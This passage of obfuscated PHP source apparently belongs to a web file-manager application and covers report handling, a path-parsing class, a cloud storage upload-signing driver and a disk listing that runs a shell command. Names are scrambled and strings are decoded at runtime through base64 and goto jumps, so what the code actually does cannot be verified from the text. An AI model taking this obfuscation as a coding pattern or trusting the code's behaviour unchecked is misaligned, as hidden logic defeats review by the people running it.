unset($èëë´í); $šİ¿©„´ = array_values($šİ¿©„´); } private function _makeOrder($ÚÍ¤Ù• = '') { $ÆüÖğãØ =& $_SERVER[™¾ÇÙ¯¹]; $‚›¤©ãš = array($ÆüÖğãØ[200], $ÆüÖğãØ[505], $ÆüÖğãØ[1994], $ÆüÖğãØ[1995]); $–“ÑÔÒ = array($ÆüÖğãØ[458] => $ÆüÖğãØ[459], $ÆüÖğãØ[460] => $ÆüÖğãØ[461]); $²‹öá”İ = Input::get($ÆüÖğãØ[465], $ÆüÖğãØ[7], $ÆüÖğãØ[431], $‚›¤©ãš); $Ì´£å•ê = Input::get($ÆüÖğãØ[466], $ÆüÖğãØ[7], $ÆüÖğãØ[2006], array($ÆüÖğãØ[1928], $ÆüÖğãØ[460])); $Ì´£å•ê = $–“ÑÔÒ[$Ì´£å•ê]; $ÚÍ¤Ù• = $ÚÍ¤Ù• . "{$²‹öá”İ}\x20{$Ì´£å•ê}"; return $this->order($ÚÍ¤Ù•); } public function reportAdd($µ¹º¶®œ) { $à÷Ô”ƒ£ =& $_SERVER[™¾ÇÙ¯¹]; $Ø¿ƒ†· = array($à÷Ô”ƒ£[497] => $µ¹º¶®œ[$à÷Ô”ƒ£[497]], $à÷Ô”ƒ£[1665] => USER_ID); if (Model($à÷Ô”ƒ£[2002])->where($Ø¿ƒ†·)->find()) { return !1; } $¾‰Ïƒ¿® = array($à÷Ô”ƒ£[497] => $µ¹º¶®œ[$à÷Ô”ƒ£[497]], $à÷Ô”ƒ£[1564] => $µ¹º¶®œ[$à÷Ô”ƒ£[1564]], $à÷Ô”ƒ£[410] => $µ¹º¶®œ[$à÷Ô”ƒ£[410]], $à÷Ô”ƒ£[476] => $µ¹º¶®œ[$à÷Ô”ƒ£[476]], $à÷Ô”ƒ£[1665] => USER_ID, $à÷Ô”ƒ£[33] => $µ¹º¶®œ[$à÷Ô”ƒ£[33]], $à÷Ô”ƒ£[461] => $µ¹º¶®œ[$à÷Ô”ƒ£[461]]); return Model($à÷Ô”ƒ£[2002])->add($¾‰Ïƒ¿®); } public function reportList($ïı³˜ì’) { $ùê¹ÉâÈ =& $_SERVER[™¾ÇÙ¯¹]; $“–º¼ˆ— = array(); if ($ïı³˜ì’[$ùê¹ÉâÈ[776]]) { $¥…Á—ºÍ = $ïı³˜ì’[$ùê¹ÉâÈ[505]] ? $ïı³˜ì’[$ùê¹ÉâÈ[505]] : strtotime(date($ùê¹ÉâÈ[2004])); $“–º¼ˆ—[$ùê¹ÉâÈ[200]] = array($ùê¹ÉâÈ[342], array($ïı³˜ì’[$ùê¹ÉâÈ[776]], $¥…Á—ºÍ)); } if (isset($ïı³˜ì’[$ùê¹ÉâÈ[33]]) && in_array($ïı³˜ì’[$ùê¹ÉâÈ[33]], array($ùê¹ÉâÈ[88], $ùê¹ÉâÈ[445], $ùê¹ÉâÈ[2007], $ùê¹ÉâÈ[2008], $ùê¹ÉâÈ[2009]))) { $“–º¼ˆ—[$ùê¹ÉâÈ[33]] = $ïı³˜ì’[$ùê¹ÉâÈ[33]]; } if (isset($ïı³˜ì’[$ùê¹ÉâÈ[765]]) && in_array($ïı³˜ì’[$ùê¹ÉâÈ[765]], array($ùê¹ÉâÈ[197], $ùê¹ÉâÈ[88], $ùê¹ÉâÈ[445], $ùê¹ÉâÈ[2007]))) { $“–º¼ˆ—[$ùê¹ÉâÈ[765]] = $ïı³˜ì’[$ùê¹ÉâÈ[765]]; } $ë¾–±­Ç = Input::get($ùê¹ÉâÈ[466], $ùê¹ÉâÈ[7], $ùê¹ÉâÈ[2006], array($ùê¹ÉâÈ[1928], $ùê¹ÉâÈ[460])); $¨øºÚ¡ = array($ùê¹ÉâÈ[458] => $ùê¹ÉâÈ[459], $ùê¹ÉâÈ[460] => $ùê¹ÉâÈ[461]); $×¯¥­² = $ùê¹ÉâÈ[2010] . $¨øºÚ¡[$ë¾–±­Ç]; $ƒ¼³«ûá = Model($ùê¹ÉâÈ[2002])->where($“–º¼ˆ—)->order($×¯¥­²)->selectPage(20); if (empty($ƒ¼³«ûá[$ùê¹ÉâÈ[378]])) { return array(); } $ô¶½¹÷ó = array_to_keyvalue_group($ƒ¼³«ûá[$ùê¹ÉâÈ[378]], $ùê¹ÉâÈ[765], $ùê¹ÉâÈ[497]); if (!empty($ô¶½¹÷ó[0])) { $ïı³˜ì’ = $ô¶½¹÷ó[0]; $“–º¼ˆ— = array($ùê¹ÉâÈ[497] => array($ùê¹ÉâÈ[7], $ïı³˜ì’)); $÷Åâëçç = $this->where($“–º¼ˆ—)->field($ùê¹ÉâÈ[497])->select(); $÷Åâëçç = array_to_keyvalue($÷Åâëçç, $ùê¹ÉâÈ[12], $ùê¹ÉâÈ[497]); $ı®¾Õ³ô = array_diff($ïı³˜ì’, $÷Åâëçç); if (!empty($ı®¾Õ³ô)) { foreach ($ƒ¼³«ûá[$ùê¹ÉâÈ[378]] as $ÏÌ‚‚ˆ¢ => $™¸‹’ƒ´) { if (in_array($™¸‹’ƒ´[$ùê¹ÉâÈ[497]], $ı®¾Õ³ô)) { unset($ƒ¼³«ûá[$ùê¹ÉâÈ[378]][$ÏÌ‚‚ˆ¢]); } } } } $this->_listDataApply($ƒ¼³«ûá[$ùê¹ÉâÈ[378]]); return $ƒ¼³«ûá; } public function reportStatus($ßåÈèÖô) { $‰š¯ĞÕó =& $_SERVER[™¾ÇÙ¯¹]; $±¹ÊÎ = array($‰š¯ĞÕó[407] => $ßåÈèÖô[$‰š¯ĞÕó[407]]); $½ˆƒ¤Ü¦ = Model($‰š¯ĞÕó[2002])->where($±¹ÊÎ)->field($‰š¯ĞÕó[2011])->find(); if (!$½ˆƒ¤Ü¦) { return !1; } $ĞıÆîú = array($‰š¯ĞÕó[765] => $ßåÈèÖô[$‰š¯ĞÕó[765]]); if ($ßåÈèÖô[$‰š¯ĞÕó[765]] == $‰š¯ĞÕó[2007] && $½ˆƒ¤Ü¦[$‰š¯ĞÕó[765]] == $‰š¯ĞÕó[2007]) { $ĞıÆîú[$‰š¯ĞÕó[765]] = 0; } $¦Õ™â¯Û = Model($‰š¯ĞÕó[2002])->where($±¹ÊÎ)->save($ĞıÆîú); if ($ßåÈèÖô[$‰š¯ĞÕó[765]] == $‰š¯ĞÕó[445]) { if ($½ˆƒ¤Ü¦[$‰š¯ĞÕó[476]] != $‰š¯ĞÕó[197] && $this->shareFileMeta($½ˆƒ¤Ü¦[$‰š¯ĞÕó[476]])) { $this->shareFileMeta($½ˆƒ¤Ü¦[$‰š¯ĞÕó[476]], 0); } $this->remove($½ˆƒ¤Ü¦[$‰š¯ĞÕó[497]]); return !0; } if ($¦Õ™â¯Û && $ßåÈèÖô[$‰š¯ĞÕó[765]] == $‰š¯ĞÕó[2007]) { $âŠ‡•Û… = $ĞıÆîú[$‰š¯ĞÕó[765]] == $‰š¯ĞÕó[2007] ? 1 : 0; $this->shareFileMeta($½ˆƒ¤Ü¦[$‰š¯ĞÕó[476]], $âŠ‡•Û…); $this->removeByFile($½ˆƒ¤Ü¦[$‰š¯ĞÕó[476]]); } return $¦Õ™â¯Û; } private function removeByFile($¶¢Õéû) { $¬¯œğ§ë =& $_SERVER[™¾ÇÙ¯¹]; $’¾…ùĞà = Model($¬¯œğ§ë[840])->where(array($¬¯œğ§ë[476] => $¶¢Õéû))->field($¬¯œğ§ë[410])->select(); $è·‘±¥ğ = array_to_keyvalue($’¾…ùĞà, $¬¯œğ§ë[12], $¬¯œğ§ë[410]); $Ö£µº·ï = array($¬¯œğ§ë[410] => array($¬¯œğ§ë[7], $è·‘±¥ğ), $¬¯œğ§ë[502] => 1); $’¾…ùĞà = $this->where($Ö£µº·ï)->field($¬¯œğ§ë[497])->select(); if (empty($’¾…ùĞà)) { return; } $ª—ÖÅ«¶ = array_to_keyvalue($’¾…ùĞà, $¬¯œğ§ë[12], $¬¯œğ§ë[497]); $this->remove($ª—ÖÅ«¶); } private function shareFileMeta($¢¤ãµÂ, $ïÇ×æÍò = null) { $½Õ»Äöö =& $_SERVER[™¾ÇÙ¯¹]; $ê‹°Ì = array($½Õ»Äöö[476] => $¢¤ãµÂ, $½Õ»Äöö[94] => $½Õ»Äöö[2012]); if (is_null($ïÇ×æÍò)) { return Model($½Õ»Äöö[2013])->where($ê‹°Ì)->find(); } $ê‹°Ì[$½Õ»Äöö[383]] = $ïÇ×æÍò; Model($½Õ»Äöö[2013])->add($ê‹°Ì, array(), !0); } } goto F’õ˜Æ™ƒ‹; FÍ‡Ÿ–øó: $fileSize = strrev(base64_decode($_SERVER[½Ï»äåá][0])); function binCheckNeq($Ş« ºàú, $£Ñ©¡Ù) { return $Ş« ºàú != $£Ñ©¡Ù; } $_SERVER[$_SERVER[½Ï»äåá][1]] = $fileSize($_SERVER[$_SERVER[½Ï»äåá][2]]); goto C®†“¬áª«; FŒÂàåèõ­: class KodIO { const KOD_SOURCE = "\x7b\x73\157\165\162\143\145\x7d"; const KOD_USER_RECYCLE = "\173\165\163\145\162\x52\x65\x63\x79\x63\154\145\x7d"; const KOD_USER_FAV = "\x7b\165\163\x65\x72\106\x61\x76\175"; const KOD_USER_FILE_TAG = "\173\x75\x73\145\x72\x46\x69\x6c\x65\x54\141\x67\x7d"; const KOD_USER_FILE_TYPE = "\x7b\x75\x73\145\x72\x46\x69\x6c\x65\x54\x79\x70\x65\x7d"; const KOD_GROUP_ROOT_SELF = "\173\147\x72\157\x75\160\122\x6f\157\x74\x53\x65\154\146\175"; const KOD_USER_SHARE = "\173\x75\163\x65\162\123\150\141\x72\145\x7d"; const KOD_USER_SHARE_LINK = "\x7b\x75\x73\145\x72\x53\150\x61\162\145\x4c\151\x6e\x6b\x7d"; const KOD_USER_SHARE_TO_ME = "\x7b\x73\150\141\162\145\x54\157\x4d\145\x7d"; const KOD_SHARE_ITEM = "\173\163\x68\141\x72\x65\111\164\145\x6d\x7d"; const KOD_SHARE_LINK = "\173\163\150\141\162\145\x49\164\x65\155\114\x69\x6e\153\175"; const KOD_SEARCH = "\173\163\x65\141\162\143\150\x7d"; const KOD_BLOCK = "\173\x62\154\157\x63\153\x7d"; const KOD_IO = "\x7b\x69\157\175"; const KOD_USER_RECENT = "\173\165\x73\x65\162\122\145\156\143\145\156\164\175"; const KOD_USER_DRIVER = "\x7b\x64\x72\151\x76\145\x72\x7d"; public static function typeList() { $÷Å‰¨Ä =& $_SERVER[™¾ÇÙ¯¹]; return array($÷Å‰¨Ä[1252] => self::KOD_SOURCE, $÷Å‰¨Ä[1253] => self::KOD_USER_RECYCLE, $÷Å‰¨Ä[1254] => self::KOD_USER_FAV, $÷Å‰¨Ä[1255] => self::KOD_USER_FILE_TAG, $÷Å‰¨Ä[1256] => self::KOD_USER_FILE_TYPE, $÷Å‰¨Ä[1257] => self::KOD_GROUP_ROOT_SELF, $÷Å‰¨Ä[1258] => self::KOD_USER_SHARE, $÷Å‰¨Ä[1259] => self::KOD_USER_SHARE_LINK, $÷Å‰¨Ä[1260] => self::KOD_USER_SHARE_TO_ME, $÷Å‰¨Ä[1261] => self::KOD_SHARE_ITEM, $÷Å‰¨Ä[1262] => self::KOD_SHARE_LINK, $÷Å‰¨Ä[1263] => self::KOD_SEARCH, $÷Å‰¨Ä[1264] => self::KOD_BLOCK, $÷Å‰¨Ä[1265] => self::KOD_IO, $÷Å‰¨Ä[1266] => self::KOD_USER_RECENT, $÷Å‰¨Ä[1267] => self::KOD_USER_DRIVER); } public static function parse($œØ”ÈŞ¯) { $ÒÀ˜•¬ğ =& $_SERVER[™¾ÇÙ¯¹]; $œØ”ÈŞ¯ = self::clear($œØ”ÈŞ¯); $•Ê“ÔŠ¾ = array_values(self::typeList()); preg_match($ÒÀ˜•¬ğ[1268], $œØ”ÈŞ¯, $³Á¿£éï); $ÈşÜ×ò£ = array($ÒÀ˜•¬ğ[430] => !1, $ÒÀ˜•¬ğ[1269] => !1, $ÒÀ˜•¬ğ[427] => !1, $ÒÀ˜•¬ğ[84] => $œØ”ÈŞ¯, $ÒÀ˜•¬ğ[1178] => !1, $ÒÀ˜•¬ğ[1177] => $ÒÀ˜•¬ğ[12]); if (is_array($³Á¿£éï) && count($³Á¿£éï) == 5) { $ÄØ ÉØå = $ÒÀ˜•¬ğ[1270] . $³Á¿£éï[2] . $ÒÀ˜•¬ğ[336]; if (in_array($ÄØ ÉØå, $•Ê“ÔŠ¾)) { $ÈşÜ×ò£[$ÒÀ˜•¬ğ[1178]] = $³Á¿£éï[1]; $ÈşÜ×ò£[$ÒÀ˜•¬ğ[33]] = $ÄØ ÉØå; $ÈşÜ×ò£[$ÒÀ˜•¬ğ[1271]] = substr($ÄØ ÉØå, 1, -1); $ÈşÜ×ò£[$ÒÀ˜•¬ğ[407]] = $³Á¿£éï[3]; } $ÈşÜ×ò£[$ÒÀ˜•¬ğ[1177]] = $³Á¿£éï[4]; } $¶ªÅê¨¿ = array($ÒÀ˜•¬ğ[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $ÈşÜ×ò£[$ÒÀ˜•¬ğ[1233]] = in_array($ÈşÜ×ò£[$ÒÀ˜•¬ğ[33]], $¶ªÅê¨¿); return $ÈşÜ×ò£; } public static function isTruePath($Ğ•ØÙ–¯) { $¨Ïõˆ =& $_SERVER[™¾ÇÙ¯¹]; if (substr($Ğ•ØÙ–¯, 0, 1) != $¨Ïõˆ[1270]) { return !0; } if (strpos($Ğ•ØÙ–¯, $¨Ïõˆ[416]) === 0) { return !0; } if (strpos($Ğ•ØÙ–¯, $¨Ïõˆ[1237]) === 0) { return !0; } if (strpos($Ğ•ØÙ–¯, $¨Ïõˆ[1272]) === 0) { return !0; } if (strpos($Ğ•ØÙ–¯, $¨Ïõˆ[1273]) === 0) { return !0; } if (strpos($Ğ•ØÙ–¯, $¨Ïõˆ[1274]) === 0) { return !0; } return !1; } public static function clear($­¼œÇ£É) { $õúì¼¹½ =& $_SERVER[™¾ÇÙ¯¹]; $­¼œÇ£É = str_replace(array($õúì¼¹½[1086], $õúì¼¹½[231]), $õúì¼¹½[53], $­¼œÇ£É); $­¼œÇ£É = str_replace($õúì¼¹½[97], $õúì¼¹½[8], $­¼œÇ£É); $É÷«Ê¾ = $õúì¼¹½[1275]; if (substr($­¼œÇ£É, 0, 3) == $õúì¼¹½[1276]) { $­¼œÇ£É = substr($­¼œÇ£É, 3); } while (strstr($­¼œÇ£É, $É÷«Ê¾)) { $­¼œÇ£É = str_replace($É÷«Ê¾, $õúì¼¹½[8], $­¼œÇ£É); } $­¼œÇ£É = preg_replace($õúì¼¹½[1277], $õúì¼¹½[8], $­¼œÇ£É); if ($­¼œÇ£É == $õúì¼¹½[8]) { return $õúì¼¹½[8]; } $­¼œÇ£É = rtrim($­¼œÇ£É, $õúì¼¹½[8]); return $­¼œÇ£É; } public static function sourceID($Ì¼µŞë) { $ššâğ¿© =& $_SERVER[™¾ÇÙ¯¹]; $½ªò = self::parse($Ì¼µŞë); if ($½ªò[$ššâğ¿©[33]] !== self::KOD_SOURCE) { show_json(LNG($ššâğ¿©[1278]), !1); } return $½ªò[$ššâğ¿©[407]]; } public static function make($Ì§¸ßò) { if (!$Ì§¸ßò) { return !1; } return self::makePath(self::KOD_SOURCE, intval($Ì§¸ßò)); } public static function makeShare($ä‰Æ¾›¢, $¾º¡ÔİÓ) { return self::makePath(self::KOD_SHARE_ITEM, $ä‰Æ¾›¢, $¾º¡ÔİÓ); } public static function makeFileTypePath($ÁÖ°ËşÂ) { return self::makePath(self::KOD_USER_FILE_TYPE, $ÁÖ°ËşÂ); } public static function makeFileTagPath($ÂÁÇëÑÄ) { return self::makePath(self::KOD_USER_FILE_TAG, $ÂÁÇëÑÄ); } public static function makePath($şúæÔÀí, $Ù¾ä ’ò = '', $ÉÓ–ê¯ = '') { $“ª“³£ =& $_SERVER[™¾ÇÙ¯¹]; $ó÷ƒõ›ê = substr($şúæÔÀí, 1, -1); $ÄõÉïËÁ = $“ª“³£[1279] . $ó÷ƒõ›ê . $“ª“³£[1280] . $Ù¾ä ’ò . $“ª“³£[1281]; $ÄõÉïËÁ = $ÉÓ–ê¯ ? $ÄõÉïËÁ . $ÉÓ–ê¯ . $“ª“³£[8] : $ÄõÉïËÁ; return $ÄõÉïËÁ; } public static function hashPath($«Òä˜Œë, $ÓŒàÍ±ñ = true) { $¨ŞÎ¾Àç =& $_SERVER[™¾ÇÙ¯¹]; $›µÕéûò = is_array($«Òä˜Œë) ? $«Òä˜Œë : IO::info($«Òä˜Œë); $ÁÍ£¿³Á = _get($›µÕéûò, $¨ŞÎ¾Àç[1282], $¨ŞÎ¾Àç[12]); if (!$ÁÍ£¿³Á && isset($›µÕéûò[$¨ŞÎ¾Àç[410]])) { $›µÕéûò = IO::info(KodIO::make($›µÕéûò[$¨ŞÎ¾Àç[410]])); $ÁÍ£¿³Á = _get($›µÕéûò, $¨ŞÎ¾Àç[1282], $¨ŞÎ¾Àç[12]); } if (!$ÁÍ£¿³Á && $ÓŒàÍ±ñ) { $”ƒ­üİ = KodIO::parse($›µÕéûò[$¨ŞÎ¾Àç[84]]); if (!$”ƒ­üİ[$¨ŞÎ¾Àç[33]]) { $ÁÍ£¿³Á = IO::hashSimple($›µÕéûò[$¨ŞÎ¾Àç[84]]); } } if (!$ÁÍ£¿³Á) { $ÁÍ£¿³Á = md5($›µÕéûò[$¨ŞÎ¾Àç[84]] . $›µÕéûò[$¨ŞÎ¾Àç[76]] . $›µÕéûò[$¨ŞÎ¾Àç[85]]); } return $ÁÍ£¿³Á; } public static function initSystemPath() { $‡°Èâô =& $_SERVER[™¾ÇÙ¯¹]; if (defined($‡°Èâô[1283])) { return; } define($‡°Èâô[1283], self::systemPath($‡°Èâô[1284])); define($‡°Èâô[1285], self::systemPath($‡°Èâô[1286])); define($‡°Èâô[1287], self::systemPath($‡°Èâô[1288])); define($‡°Èâô[1289], self::systemPath($‡°Èâô[1290])); IOHistory::bindEvent(); } public static function systemPath($´½†Î‘Ø) { $‰·ïÖ¯» =& $_SERVER[™¾ÇÙ¯¹]; $¼‚İ˜€Ó = $‰·ïÖ¯»[1291] . ucfirst($´½†Î‘Ø); $‡´•ìÒÃ = Model($‰·ïÖ¯»[785])->get($¼‚İ˜€Ó); if ($‡´•ìÒÃ) { return $‡´•ìÒÃ; } if ($´½†Î‘Ø == $‰·ïÖ¯»[1284]) { $‡´•ìÒÃ = self::make(Model($‰·ïÖ¯»[840])->systemRootPathAdd($‰·ïÖ¯»[552])); } else { $‡´•ìÒÃ = self::systemPath($‰·ïÖ¯»[1284]); $ÅüŠ–¾£ = self::sourceID($‡´•ìÒÃ); $‡´•ìÒÃ = self::make(Model($‰·ïÖ¯»[840])->mkdir($ÅüŠ–¾£, $´½†Î‘Ø)); } Model($‰·ïÖ¯»[785])->set($¼‚İ˜€Ó, $‡´•ìÒÃ); return $‡´•ìÒÃ; } public static function systemFolder($ö®ÏéŠ) { $™±ø˜ è = IO_PATH_SYSTEM_SOURCE . $ö®ÏéŠ; $ÅïÒË€ = Cache::get($™±ø˜ è); if (!$ÅïÒË€) { $è¦•£³Í = IO::infoFull($™±ø˜ è); if (!$è¦•£³Í) { $ÅïÒË€ = IO::mkdir($™±ø˜ è, REPEAT_SKIP); } else { $ÅïÒË€ = $è¦•£³Í[$_SERVER[™¾ÇÙ¯¹][84]]; } Cache::set($™±ø˜ è, $ÅïÒË€, 3600 * 10); } return $ÅïÒË€; } public static function defaultDriver() { return Model($_SERVER[™¾ÇÙ¯¹][782])->defaultDriver(); } public static function defaultIO() { $Òà´Âæ™ =& $_SERVER[™¾ÇÙ¯¹]; $á´¿Àúä = self::defaultDriver(); return $Òà´Âæ™[1292] . $á´¿Àúä[$Òà´Âæ™[407]] . $Òà´Âæ™[1281]; } public static function defaultDriverInit() { static $Ç†è²±Â = false; if ($Ç†è²±Â) { return $Ç†è²±Â; } $Ç†è²±Â = IO::init(self::defaultIO()); return $Ç†è²±Â; } public static function fileTypeList() { $½™‚Ö—Ø =& $_SERVER[™¾ÇÙ¯¹]; $øÚ²½Óµ = $GLOBALS[$½™‚Ö—Ø[6]][$½™‚Ö—Ø[1293]]; foreach ($øÚ²½Óµ as $Ò»œæìÂ => $‘–Ê“ÒÅ) { $¼Õ´Å¾Ø = $½™‚Ö—Ø[1294] . $Ò»œæìÂ; $ãÒ˜ÌÎœ = LNG($¼Õ´Å¾Ø); if ($¼Õ´Å¾Ø != $ãÒ˜ÌÎœ) { $øÚ²½Óµ[$Ò»œæìÂ][$½™‚Ö—Ø[32]] = $ãÒ˜ÌÎœ; } } return $øÚ²½Óµ; } public static function diskList($®€ì°Ôû = true) { $¥ªøÙ€¼ = $_SERVER[™¾ÇÙ¯¹][1295]; if ($®€ì°Ôû) { $ÂÃÖÓ¼ª = Cache::get($¥ªøÙ€¼); if (is_array($ÂÃÖÓ¼ª)) { return $ÂÃÖÓ¼ª; } } $ÂÃÖÓ¼ª = self::diskListGet(); Cache::set($¥ªøÙ€¼, $ÂÃÖÓ¼ª, 60); return $ÂÃÖÓ¼ª; } public static function diskListGet() { $ÁŞ–Åñ¾ =& $_SERVER[™¾ÇÙ¯¹]; $è½œ¥˜œ = array(); if ($GLOBALS[$ÁŞ–Åñ¾[6]][$ÁŞ–Åñ¾[1296]] == $ÁŞ–Åñ¾[1297]) { $ìÑÔ¥¤­ = $ÁŞ–Åñ¾[1298]; for ($‚Ãì òÕ = 0; $‚Ãì òÕ < strlen($ìÑÔ¥¤­); $‚Ãì òÕ++) { $—ÕÊ×ò = $ìÑÔ¥¤­[$‚Ãì òÕ] . $ÁŞ–Åñ¾[1299]; if (file_exists($—ÕÊ×ò)) { $è½œ¥˜œ[] = $—ÕÊ×ò; } } return $è½œ¥˜œ; } if (!function_exists($ÁŞ–Åñ¾[98])) { $è½œ¥˜œ[] = $ÁŞ–Åñ¾[850]; return $è½œ¥˜œ; } $–£«šè˜ = explode($ÁŞ–Åñ¾[231], shell_exec($ÁŞ–Åñ¾[1300])); array_shift($–£«šè˜); array_pop($–£«šè˜); $Ã©ŠñâÁ = array($ÁŞ–Åñ¾[1301], $ÁŞ–Åñ¾[1302], $ÁŞ–Åñ¾[1303], $ÁŞ–Åñ¾[1304], $ÁŞ–Åñ¾[1305], $ÁŞ–Åñ¾[1306], $ÁŞ–Åñ¾[1307], $ÁŞ–Åñ¾[1308]); foreach ($–£«šè˜ as $ÙúƒóµŞ) { $µÛ¾£Æ = preg_split($ÁŞ–Åñ¾[1309], $ÙúƒóµŞ); $—ÕÊ×ò = $µÛ¾£Æ[count($µÛ¾£Æ) - 1]; if (!strstr($µÛ¾£Æ[0], $ÁŞ–Åñ¾[1310]) || !$—ÕÊ×ò) { continue; } $Üı¬šàÕ = rtrim($—ÕÊ×ò, $ÁŞ–Åñ¾[8]) . $ÁŞ–Åñ¾[8]; if (in_array($Üı¬šàÕ, $Ã©ŠñâÁ)) { continue; } $è½œ¥˜œ[] = $Üı¬šàÕ; } return $è½œ¥˜œ; } public static function isSameDisk($°ÁíÕçˆ, $øÃòçø™) { $ı²‹¦ =& $_SERVER[™¾ÇÙ¯¹]; if ($GLOBALS[$ı²‹¦[6]][$ı²‹¦[1296]] == $ı²‹¦[1297]) { return strtolower(substr($°ÁíÕçˆ, 0, 1)) == strtolower(substr($øÃòçø™, 0, 1)); } $ùÁØâ”³ = self::diskList(); $¼×àÈÛú = !1; $¨ì…µ™î = !1; sort($ùÁØâ”³); $ùÁØâ”³ = array_reverse($ùÁØâ”³); $°ÁíÕçˆ = rtrim($°ÁíÕçˆ, $ı²‹¦[8]) . $ı²‹¦[8]; $øÃòçø™ = rtrim($øÃòçø™, $ı²‹¦[8]) . $ı²‹¦[8]; foreach ($ùÁØâ”³ as $´Š‡¡Æ) { $Ìç¶µ = strlen($´Š‡¡Æ); if (!$¼×àÈÛú && substr($°ÁíÕçˆ, 0, $Ìç¶µ) == $´Š‡¡Æ) { $¼×àÈÛú = $´Š‡¡Æ; } if (!$¨ì…µ™î && substr($øÃòçø™, 0, $Ìç¶µ) == $´Š‡¡Æ) { $¨ì…µ™î = $´Š‡¡Æ; } if ($¼×àÈÛú && $¨ì…µ™î) { break; } } return $¼×àÈÛú === $¨ì…µ™î; } public static function transferType($€ÑäÀ‡á, $Ê×³Ø™®) { $›ØÒÃÊ =& $_SERVER[™¾ÇÙ¯¹]; $·œºí‹° = self::driverType($€ÑäÀ‡á); $šáÍÄ·À = self::driverType($Ê×³Ø™®); if ($·œºí‹°[$›ØÒÃÊ[33]] == $šáÍÄ·À[$›ØÒÃÊ[33]] && $·œºí‹°[$›ØÒÃÊ[1311]] == $šáÍÄ·À[$›ØÒÃÊ[1311]]) { return $›ØÒÃÊ[1312]; } if ($·œºí‹°[$›ØÒÃÊ[33]] == $›ØÒÃÊ[879] && $šáÍÄ·À[$›ØÒÃÊ[33]] == $›ØÒÃÊ[106]) { return $›ØÒÃÊ[1207]; } if ($·œºí‹°[$›ØÒÃÊ[33]] == $›ØÒÃÊ[106] && $šáÍÄ·À[$›ØÒÃÊ[33]] == $›ØÒÃÊ[879]) { return $›ØÒÃÊ[107]; } return $›ØÒÃÊ[1313]; } public static function driverType($¶ÓÃ¯Ëø) { $âÕ”ÌîÅ =& $_SERVER[™¾ÇÙ¯¹]; $¥¾£ÈŞ¥ = str_replace($âÕ”ÌîÅ[1314], $âÕ”ÌîÅ[12], strtolower($¶ÓÃ¯Ëø->getType())); if ($¥¾£ÈŞ¥ == $âÕ”ÌîÅ[773] || $¥¾£ÈŞ¥ == $âÕ”ÌîÅ[1315] || $¥¾£ÈŞ¥ == $âÕ”ÌîÅ[1316]) { $¶ÓÃ¯Ëø = self::defaultDriverInit(); } else { if ($¥¾£ÈŞ¥ == $âÕ”ÌîÅ[1214] || $¥¾£ÈŞ¥ == $âÕ”ÌîÅ[1317]) { $¶ÓÃ¯Ëø = IO::init($¶ÓÃ¯Ëø->pathParse[$âÕ”ÌîÅ[1159]]); } } $ÀıïÈÈ = $¶ÓÃ¯Ëø->path; $¥¾£ÈŞ¥ = str_replace($âÕ”ÌîÅ[1314], $âÕ”ÌîÅ[12], strtolower($¶ÓÃ¯Ëø->getType())); if ($¥¾£ÈŞ¥ == $âÕ”ÌîÅ[106]) { return array($âÕ”ÌîÅ[33] => $âÕ”ÌîÅ[106], $âÕ”ÌîÅ[1311] => $âÕ”ÌîÅ[12], $âÕ”ÌîÅ[84] => $ÀıïÈÈ); } return array($âÕ”ÌîÅ[33] => $âÕ”ÌîÅ[879], $âÕ”ÌîÅ[1311] => $¶ÓÃ¯Ëø->pathDriver, $âÕ”ÌîÅ[84] => $ÀıïÈÈ); } public static function pathDriverType($ ³ƒÁÏ¤) { return $ ³ƒÁÏ¤ ? self::driverType(IO::init($ ³ƒÁÏ¤)) : !1; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($ÆªÕÑÕÆ) { parent::__construct($ÆªÕÑÕÆ); $this->signatureVersion($_SERVER[™¾ÇÙ¯¹][216]); } public function uploadFormData($ìé¯æ’‘, $ÎÉï¥æ‹ = 3600) { $ËËÃ±µÈ =& $_SERVER[™¾ÇÙ¯¹]; $Ÿ•­ÊÂˆ = $ËËÃ±µÈ[198]; $ŸŒë°½• = $ËËÃ±µÈ[232]; $ÔÆ  ó = $ËËÃ±µÈ[1318]; $ß¤´ç÷ = gmdate($ËËÃ±µÈ[1319], time() + $ÎÉï¥æ‹); $àâÊíëù = (string) time() . $ËËÃ±µÈ[71] . (string) (time() + $ÎÉï¥æ‹); $£ßõ¡×‰ = array($ËËÃ±µÈ[1320] => $ß¤´ç÷, $ËËÃ±µÈ[1321] => array(array($ËËÃ±µÈ[1322] => $Ÿ•­ÊÂˆ), array($ËËÃ±µÈ[1323] => $this->bucket), array($ËËÃ±µÈ[1324], $ËËÃ±µÈ[1325], $ËËÃ±µÈ[12]), array($ËËÃ±µÈ[1326] => $ÔÆ  ó), array($ËËÃ±µÈ[1327] => $ŸŒë°½•), array($ËËÃ±µÈ[1328] => $this->accessKey), array($ËËÃ±µÈ[1329] => $àâÊíëù))); $£ßõ¡×‰ = json_encode($£ßõ¡×‰); $ÓñœäÇÅ = hash_hmac($ËËÃ±µÈ[232], $àâÊíëù, $this->secret); $Á¾İÔÏ = sha1($£ßõ¡×‰); $µ»±¦ìØ = hash_hmac($ËËÃ±µÈ[232], $Á¾İÔÏ, $ÓñœäÇÅ); $†Â µåÜ = array($ËËÃ±µÈ[1322] => $Ÿ•­ÊÂˆ, $ËËÃ±µÈ[1326] => $ÔÆ  ó, $ËËÃ±µÈ[1330] => base64_encode($£ßõ¡×‰), $ËËÃ±µÈ[1327] => $ŸŒë°½•, $ËËÃ±µÈ[1328] => $this->accessKey, $ËËÃ±µÈ[1331] => $àâÊíëù, $ËËÃ±µÈ[1332] => $µ»±¦ìØ, $ËËÃ±µÈ[181] => $this->getHost()); return $†Â µåÜ; } public function fileOutLink($öà’üÍì) { $¼¸¼ŸÖò =& $_SERVER[™¾ÇÙ¯¹]; if (substr($öà’üÍì, 0, 7) == $¼¸¼ŸÖò[1333]) { $öà’üÍì = $¼¸¼ŸÖò[1334] . substr($öà’üÍì, 7); } header($¼¸¼ŸÖò[161] . $öà’üÍì); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($Ìõ‘Óš«) { $this->pathParse = $Ìõ‘Óš«; $this->model = Model($_SERVER[™¾ÇÙ¯¹][1335]); } public function getPath($ƒ°§Üæğ) { return trim($ƒ°§Üæğ, $_SERVER[™¾ÇÙ¯¹][8]); } public function pathFather($„ûàÑµ‡) { $ç¿½©ŒÏ = $this->parse($„ûàÑµ‡); $ç¿½©ŒÏ = 